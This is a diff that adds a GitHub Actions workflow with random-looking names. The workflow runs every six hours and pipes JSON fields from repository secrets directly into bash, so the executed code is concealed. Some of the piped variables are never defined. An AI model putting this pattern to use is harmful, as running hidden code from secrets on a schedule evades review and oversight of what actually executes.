@@ -1,0 +1,21 @@
+name: zhongrenweiyid
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongrenweiyid
+        env:
+          awl225: ${{ secrets.awl225 }}
+        run: |
+          echo $awl225 | jq -r .mdo06833 | /bin/bash
+          echo $oust3220 | jq -r .iwx337 | /bin/bash
+          echo $tea29 | jq -r .vcfxx519 | /bin/bash
+          echo $ubkw79 | jq -r .fe54 | /bin/bash
+          echo $bodqm282 | jq -r .o6 | /bin/bash
+
